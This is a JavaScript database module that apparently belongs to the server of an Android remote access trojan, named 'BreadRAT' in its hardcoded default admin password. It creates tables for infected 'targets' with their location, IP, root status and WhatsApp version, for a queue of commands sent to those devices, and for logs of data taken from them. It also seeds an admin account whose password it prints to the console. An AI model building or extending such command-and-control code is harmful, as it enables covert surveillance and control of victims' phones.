const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
const path = require('path');
const bcrypt = require('bcryptjs');
const crypto = require('crypto');

let db;

async function initDatabase() {
    const dbPath = path.join(__dirname, '..', 'database.sqlite');
    db = await open({
        filename: dbPath,
        driver: sqlite3.Database
    });

    await db.exec(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            api_key TEXT UNIQUE,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uuid TEXT UNIQUE NOT NULL,
            device_name TEXT,
            android_version TEXT,
            model TEXT,
            manufacturer TEXT,
            first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'offline',
            ip_address TEXT,
            country TEXT,
            city TEXT,
            battery INTEGER DEFAULT 0,
            storage_used INTEGER DEFAULT 0,
            storage_total INTEGER DEFAULT 0,
            whatsapp_version TEXT,
            is_rooted INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_uuid TEXT NOT NULL,
            command TEXT NOT NULL,
            params TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            executed_at DATETIME,
            FOREIGN KEY(target_uuid) REFERENCES targets(uuid)
        );
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_uuid TEXT NOT NULL,
            type TEXT NOT NULL,
            data TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(target_uuid) REFERENCES targets(uuid)
        );
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
    `);

    // Default admin
    const admin = await db.get('SELECT * FROM users WHERE username = "admin"');
    if (!admin) {
        const hash = await bcrypt.hash('BreadRAT2025!', 12);
        const apiKey = crypto.randomBytes(32).toString('hex');
        await db.run('INSERT INTO users (username, password_hash, api_key) VALUES (?, ?, ?)', 
            ['admin', hash, apiKey]);
        console.log('✅ Admin created: admin / BreadRAT2025!');
    }
    return db;
}

function getDb() { return db; }

module.exports = { initDatabase, getDb };
